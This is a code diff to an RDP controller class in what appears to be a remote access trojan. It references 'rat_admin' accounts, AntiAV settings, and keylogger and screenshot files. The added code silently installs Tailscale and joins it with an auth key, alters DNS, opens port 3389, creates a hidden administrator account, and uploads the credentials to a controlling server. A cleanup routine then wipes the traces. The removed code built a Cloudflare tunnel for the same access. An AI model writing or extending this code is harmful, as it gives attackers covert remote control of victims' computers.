@@ -24,10 +24,8 @@ class RDPController:
         self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
         chars = string.ascii_letters + string.digits + "!@#$%^&*"
         self.password = ''.join(random.choice(chars) for _ in range(14))
-        self.cloudflared_process = None
-        self.tunnel_url = None
-        self.rdp_wrapper_installed = False
-        self.behavior = {"rdp_enabled": True}  # پیش‌فرض رفتار
+        self.behavior = {"rdp_enabled": True}  # پیش‌فرض رفتا
+        self.tailscale_ip = None
         if Config.DEBUG_MODE:
             logging.info(f"RDPController initialized. User: {self.username}, Pass: {self.password[:4]}****")
 
@@ -66,6 +64,123 @@ class RDPController:
         except Exception as e:
             logging.error(f"Command execution crashed: {str(e)}")
             return {"status": "error", "stdout": "", "stderr": str(e)}
+
+    def _set_dns(self) -> bool:
+        """
+        Set DNS servers (e.g., Shecan) on the active network adapter.
+        """
+        try:
+            # Get active network adapter name
+            result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
+            if result["status"] != "success" or not result["stdout"].strip():
+                logging.error(f"Failed to get active network adapter: {result['stderr']}")
+                return False
+            adapter_name = result["stdout"].strip()
+
+            # Set primary DNS
+            cmd_primary = [
+                "netsh", "interface", "ip", "set", "dns",
+                f"name={adapter_name}", "source=static",
+                f"addr={Config.PRIMARY_DNS}"
+            ]
+            result_primary = self._run_command(cmd_primary)
+            if result_primary["status"] != "success":
+                logging.error(f"Failed to set primary DNS: {result_primary['stderr']}")
+                return False
+
+            # Set secondary DNS
+            cmd_secondary = [
+                "netsh", "interface", "ip", "add", "dns",
+                f"name={adapter_name}", f"addr={Config.SECONDARY_DNS}",
+                "index=2"
+            ]
+            result_secondary = self._run_command(cmd_secondary)
+            if result_secondary["status"] != "success":
+                logging.error(f"Failed to set secondary DNS: {result_secondary['stderr']}")
+                return False
+
+            logging.info(f"DNS set to {Config.PRIMARY_DNS} and {Config.SECONDARY_DNS} on adapter {adapter_name}")
+            return True
+        except Exception as e:
+            logging.error(f"Error setting DNS: {str(e)}")
+            return False
+
+    def _get_tailscale_ip(self) -> bool:
+        """
+        Get the Tailscale IP of the current device.
+        """
+        try:
+            result = self._run_command(["tailscale", "ip", "-4"])
+            if result["status"] == "success" and result["stdout"]:
+                self.tailscale_ip = result["stdout"].strip()
+                logging.info(f"Tailscale IP obtained: {self.tailscale_ip}")
+                return True
+            else:
+                logging.error(f"Failed to get Tailscale IP: {result['stderr']}")
+                return False
+        except Exception as e:
+            logging.error(f"Error getting Tailscale IP: {str(e)}")
+            return False
+
+    def _ensure_tailscale_running(self) -> bool:
+        """
+        Ensure Tailscale is running and connected.
+        """
+        try:
+            # Check if Tailscale is installed
+            if not os.path.exists(Config.TAILSCALE_BINARY):
+                logging.info("Installing Tailscale...")
+                result = self._run_command([
+                    "powershell", "-Command",
+                    "$installer = \"$env:TEMP\\tailscale-installer.exe\"; "
+                    "Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe' -OutFile $installer; "
+                    "Start-Process -FilePath $installer -ArgumentList '/S' -Wait; "
+                    "Remove-Item $installer"
+                ])
+                if result["status"] != "success":
+                    logging.error(f"Failed to install Tailscale: {result['stderr']}")
+                    return False
+
+            # Check Tailscale status
+            result = self._run_command(["tailscale", "status"])
+            if result["status"] == "success" and "connected" in result["stdout"].lower():
+                return self._get_tailscale_ip()
+
+            # Start Tailscale with auth key
+            result = self._run_command(["tailscale", "up", f"--authkey={Config.TAILSCALE_AUTH_KEY}"])
+            if result["status"] == "success":
+                time.sleep(5)  # Wait for connection
+                return self._get_tailscale_ip()
+            else:
+                logging.error(f"Failed to start Tailscale: {result['stderr']}")
+                return False
+        except Exception as e:
+            logging.error(f"Error checking Tailscale status: {str(e)}")
+            return False
+
+    def _configure_firewall(self) -> bool:
+        """
+        Configure firewall rules to allow RDP on Tailscale IP.
+        """
+        try:
+            # Remove existing rules
+            self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
+            # Add new rule for Tailscale IP
+            cmd = [
+                "netsh", "advfirewall", "firewall", "add", "rule",
+                "name=Allow RDP", "dir=in", "action=allow",
+                "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
+            ]
+            result = self._run_command(cmd)
+            if result["status"] == "success":
+                logging.info("Firewall rule for RDP added")
+                return True
+            else:
+                logging.error(f"Failed to configure firewall: {result['stderr']}")
+                return False
+        except Exception as e:
+            logging.error(f"Firewall configuration error: {str(e)}")
+            return False
 
     def _user_exists(self, username: str) -> bool:
         try:
@@ -267,99 +382,6 @@ class RDPController:
         except Exception as e:
             logging.error(f"Port check failed: {str(e)}")
             return False
-
-    def _configure_cloudflare_hostname(self) -> bool:
-        try:
-            if getattr(sys, 'frozen', False):
-                base_path = sys._MEIPASS
-            else:
-                base_path = os.path.dirname(__file__)
-            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
-            if not os.path.exists(cloudflared_path):
-                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
-                return False
-            if not Config.CLOUDFLARE_SUBDOMAIN or not Config.CLOUDFLARE_DOMAIN or not Config.CLOUDFLARE_TUNNEL_TOKEN:
-                logging.error("Cloudflare subdomain, domain, or tunnel token missing in config")
-                return False
-            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
-            cloudflared_cmd = [
-                cloudflared_path, "tunnel", "route", "dns",
-                "rdp-tunnel", hostname
-            ]
-            result = self._run_command(cloudflared_cmd)
-            if result["status"] != "success":
-                logging.error(f"Failed to configure Cloudflare hostname: {result['stderr']}")
-                return False
-            logging.info(f"Cloudflare hostname configured: {hostname}")
-            return True
-        except Exception as e:
-            logging.error(f"Cloudflare hostname configuration error: {str(e)}")
-            return False
-
-    def _start_cloudflare_tunnel(self) -> Optional[str]:
-        try:
-            if getattr(sys, 'frozen', False):
-                base_path = sys._MEIPASS
-            else:
-                base_path = os.path.dirname(__file__)
-            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
-            if not os.path.exists(cloudflared_path):
-                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
-                return None
-            config_path = os.path.join(base_path, "cloudflared_config.yml")
-            config_content = f"""
-tunnel: rdp-tunnel
-credentials-file: {os.path.join(base_path, 'cloudflared_creds.json')}
-protocol: http2
-ingress:
-  - hostname: {Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}
-    service: rdp://localhost:3389
-  - service: http_status:404
-"""
-            with open(config_path, "w") as f:
-                f.write(config_content)
-            creds_content = {"AccountTag": "", "TunnelSecret": Config.CLOUDFLARE_TUNNEL_TOKEN, "TunnelID": "rdp-tunnel"}
-            with open(os.path.join(base_path, "cloudflared_creds.json"), "w") as f:
-                json.dump(creds_content, f)
-            cloudflared_cmd = [cloudflared_path, "tunnel", "--config", config_path, "run"]
-            self.cloudflared_process = subprocess.Popen(
-                cloudflared_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
-            start_time = time.time()
-            timeout = 30
-            while time.time() - start_time < timeout:
-                try:
-                    response = requests.get(f"https://{hostname}/", timeout=5)
-                    if response.status_code in [200, 404]:
-                        logging.info(f"Cloudflare tunnel started: https://{hostname}")
-                        return f"https://{hostname}"
-                except requests.RequestException:
-                    pass
-                time.sleep(2)
-            logging.error("Cloudflare tunnel failed to start within timeout")
-            self._stop_cloudflare_tunnel()
-            return None
-        except Exception as e:
-            logging.error(f"Cloudflare tunnel error: {str(e)}")
-            self._stop_cloudflare_tunnel()
-            return None
-
-    def _stop_cloudflare_tunnel(self):
-        if self.cloudflared_process:
-            try:
-                self.cloudflared_process.terminate()
-                self.cloudflared_process.wait(timeout=5)
-                logging.info("Cloudflare tunnel stopped")
-            except Exception as e:
-                logging.error(f"Failed to stop Cloudflare tunnel: {str(e)}")
-            self.cloudflared_process = None
-            self.tunnel_url = None
-
     def update_behavior(self, behavior: Dict):
         """
         به‌روزرسانی تنظیمات رفتار (مثل rdp_enabled) از AntiAV یا سرور
@@ -368,150 +390,196 @@ ingress:
         if Config.DEBUG_MODE:
             logging.info(f"RDPController behavior updated: {self.behavior}")
 
+    
     def enable_rdp(self) -> Dict[str, Any]:
-        if not self.behavior["rdp_enabled"]:
-            logging.info("RDP disabled by AntiAV behavior settings")
-            return {
-                "status": "error",
-                "message": "RDP disabled by AntiAV",
-                "username": None,
-                "password": None,
-                "tunnel_url": None
-            }
         if not self._is_admin():
-            logging.error("Administrator privileges required to enable RDP")
+            logging.warning("Administrator access required to enable RDP")
             return {
                 "status": "error",
-                "message": "Administrator privileges required",
-                "username": None,
-                "password": None,
-                "tunnel_url": None
+                "error": "Administrator access required",
+                "username": "",
+                "password": "",
+                "tunnel_url": ""
+            }
+        if not self.behavior["rdp_enabled"]:
+            logging.info("RDP disabled by configuration")
+            return {
+                "status": "error",
+                "error": "RDP disabled by configuration",
+                "username": "",
+                "password": "",
+                "tunnel_url": ""
             }
         try:
-            logging.info("Starting RDP enable process...")
-            if not self._enable_rdp_registry():
+            logging.info("Starting RDP enable...")
+            # Set DNS to ensure Tailscale connectivity
+            if not self._set_dns():
+                logging.warning("Failed to set DNS, proceeding with current DNS settings")
+
+            # Ensure Tailscale is running
+            if not self._ensure_tailscale_running():
                 return {
                     "status": "error",
-                    "message": "Failed to enable RDP in registry",
-                    "username": None,
-                    "password": None,
-                    "tunnel_url": None
+                    "error": "Failed to connect to Tailscale",
+                    "username": "",
+                    "password": "",
+                    "tunnel_url": ""
                 }
-            if not self._start_service("TermService"):
-                return {
-                    "status": "error",
-                    "message": "Failed to start Terminal Services",
-                    "username": None,
-                    "password": None,
-                    "tunnel_url": None
-                }
+            # Configure firewall
             if not self._configure_firewall():
                 return {
                     "status": "error",
-                    "message": "Failed to configure firewall",
-                    "username": None,
-                    "password": None,
-                    "tunnel_url": None
+                    "error": "Failed to configure firewall",
+                    "username": "",
+                    "password": "",
+                    "tunnel_url": ""
                 }
+            # Create user
             if not self._create_user():
                 return {
                     "status": "error",
-                    "message": "Failed to create user",
-                    "username": None,
-                    "password": None,
-                    "tunnel_url": None
+                    "error": "Failed to create user",
+                    "username": "",
+                    "password": "",
+                    "tunnel_url": ""
                 }
+            # Configure user groups
             if not self._configure_user_groups():
                 return {
                     "status": "error",
-                    "message": "Failed to configure user groups",
-                    "username": None,
-                    "password": None,
-                    "tunnel_url": None
+                    "error": "Failed to configure user groups",
+                    "username": "",
+                    "password": "",
+                    "tunnel_url": ""
                 }
-            if not self._configure_cloudflare_hostname():
-                logging.warning("Cloudflare hostname configuration failed; attempting tunnel without hostname")
-            self.tunnel_url = self._start_cloudflare_tunnel()
-            if not self.tunnel_url:
-                logging.warning("Cloudflare tunnel not started; RDP may still work locally")
+            # Enable RDP in registry
+            if not self._enable_rdp_registry():
+                return {
+                    "status": "error",
+                    "error": "Failed to enable RDP in registry",
+                    "username": "",
+                    "password": "",
+                    "tunnel_url": ""
+                }
+
             tunnel_info = {
                 "client_id": Config.get_client_id(),
                 "username": self.username,
                 "password": self.password,
-                "tunnel_url": self.tunnel_url,
-                "local_ip": socket.gethostbyname(socket.gethostname()),
-                "port": 3389,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                "tunnel_url": f"{self.tailscale_ip}:3389"
             }
-            try:
-                self.communicator.report_rdp_tunnel(tunnel_info)
-                logging.info("RDP tunnel info reported to server")
-            except Exception as e:
-                logging.error(f"Failed to report RDP tunnel: {str(e)}")
-            logging.info("RDP enabled and configured successfully")
+            self.communicator.upload(tunnel_info)
+            logging.info("RDP enabled successfully")
             return {
                 "status": "success",
                 "message": "RDP enabled successfully",
                 "username": self.username,
                 "password": self.password,
-                "tunnel_url": self.tunnel_url
+                "tunnel_url": f"{self.tailscale_ip}:3389"
             }
         except Exception as e:
-            logging.error(f"Enable RDP error: {str(e)}")
+            logging.error(f"Error enabling RDP: {str(e)}")
             return {
                 "status": "error",
-                "message": f"Failed to enable RDP: {str(e)}",
-                "username": None,
-                "password": None,
-                "tunnel_url": None
+                "error": f"Failed to enable RDP: {str(e)}",
+                "username": "",
+                "password": "",
+                "tunnel_url": ""
             }
 
-    def disable_rdp(self) -> Dict[str, Any]:
+    def cleanup_rdp(self) -> Dict[str, Any]:
         try:
-            logging.info("Starting RDP disable process...")
-            self._stop_cloudflare_tunnel()
+            if not self._is_admin():
+                logging.error("Administrator privileges required for cleanup")
+                return {
+                    "status": "error",
+                    "message": "Administrator privileges required",
+                    "details": []
+                }
+
+            logging.info("Starting comprehensive RDP cleanup...")
+            details = []
+
+            # Disable RDP in registry
             try:
                 reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
                 with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                     winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
-                logging.info("RDP disabled in registry")
+                details.append({"action": "disable_rdp_reg", "status": "success", "message": "RDP disabled in registry"})
             except Exception as e:
-                logging.error(f"Registry disable error: {str(e)}")
-            cleanup_commands = [
-                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
-                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
-                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
-            ]
-            for cmd in cleanup_commands:
-                result = self._run_command(cmd)
-                if result["status"] == "success":
-                    logging.info(f"Cleaned up firewall rule: {cmd[0]}")
+                details.append({"action": "disable_rdp_reg", "status": "error", "message": str(e)})
+
+            # Remove firewall rules
+            result = self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
+            if result["status"] == "success":
+                details.append({"action": "remove_firewall_rule", "status": "success", "message": "Firewall rule removed"})
+            else:
+                details.append({"action": "remove_firewall_rule", "status": "error", "message": result["stderr"]})
+
+            # Remove users
+            try:
+                ps_command = "Get-LocalUser | Where-Object { $_.Name -like 'rat_admin_*' } | Select-Object -ExpandProperty Name"
+                result = self._run_command(["powershell", "-Command", ps_command])
+                if result["status"] == "success" and result["stdout"].strip():
+                    users = result["stdout"].splitlines()
+                    for user in users:
+                        user = user.strip()
+                        if user:
+                            del_result = self._run_command(["net", "user", user, "/delete"])
+                            if del_result["status"] == "success":
+                                details.append({"action": f"remove_user_{user}", "status": "success", "message": f"Deleted user {user}"})
+                            else:
+                                details.append({"action": f"remove_user_{user}", "status": "error", "message": del_result["stderr"]})
                 else:
-                    logging.debug(f"Cleanup command failed: {result['stderr']}")
-            if self._user_exists(self.username):
-                result = self._run_command(["net", "user", self.username, "/delete"])
-                if result["status"] == "success":
-                    logging.info(f"User {self.username} deleted")
-                else:
-                    logging.error(f"Failed to delete user: {result['stderr']}")
-            logging.info("RDP disabled successfully")
+                    details.append({"action": "remove_users", "status": "success", "message": "No rat_admin_* users found"})
+            except Exception as e:
+                details.append({"action": "remove_users", "status": "error", "message": str(e)})
+
+            # Remove temporary files
+            temp_files = ["keylogger.log", "screenshot.png", "recursive_list.txt", "rdp_diagnostic.log"]
+            for file in temp_files:
+                try:
+                    if os.path.exists(file):
+                        os.remove(file)
+                        details.append({"action": f"remove_file_{file}", "status": "success", "message": f"Removed {file}"})
+                except Exception as e:
+                    details.append({"action": f"remove_file_{file}", "status": "error", "message": str(e)})
+
+            # Reset DNS to DHCP (optional, to avoid permanent changes)
+            try:
+                result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
+                if result["status"] == "success" and result["stdout"].strip():
+                    adapter_name = result["stdout"].strip()
+                    self._run_command(["netsh", "interface", "ip", "set", "dns", f"name={adapter_name}", "source=dhcp"])
+                    details.append({"action": "reset_dns", "status": "success", "message": "DNS reset to DHCP"})
+            except Exception as e:
+                details.append({"action": "reset_dns", "status": "error", "message": str(e)})
+
+            # Report cleanup
+            try:
+                cleanup_report = {
+                    "client_id": Config.get_client_id(),
+                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                    "details": details
+                }
+                self.communicator.report_cleanup(cleanup_report)
+                details.append({"action": "report_cleanup", "status": "success", "message": "Cleanup reported to server"})
+            except Exception as e:
+                details.append({"action": "report_cleanup", "status": "error", "message": str(e)})
+
             return {
                 "status": "success",
-                "message": "RDP disabled successfully",
-                "username": None,
-                "password": None,
-                "tunnel_url": None
+                "message": "RDP cleanup completed successfully",
+                "details": details
             }
         except Exception as e:
-            logging.error(f"Disable RDP error: {str(e)}")
+            logging.error(f"RDP cleanup error: {str(e)}")
             return {
                 "status": "error",
-                "message": f"Failed to disable RDP: {str(e)}",
-                "username": None,
-                "password": None,
-                "tunnel_url": None
+                "message": f"RDP cleanup failed: {str(e)}",
+                "details": []
             }
-
+        
     def start(self):
         if not self.behavior["rdp_enabled"]:
             logging.info("RDP start skipped due to AntiAV behavior settings")
